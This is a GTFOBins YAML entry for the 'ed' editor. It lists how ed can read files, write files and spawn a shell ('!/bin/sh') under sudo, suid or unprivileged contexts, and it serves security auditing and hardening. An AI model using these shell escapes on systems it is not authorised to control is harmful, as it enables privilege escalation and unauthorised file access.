<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ed -->
---
functions:
  file-read:
  - binary: false
    code: |-
      ed /path/to/input-file
      ,p
      q
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - binary: false
    code: |-
      ed /path/to/output-file
      a
      DATA
      .
      w
      q
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      ed
      !/bin/sh
      q
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
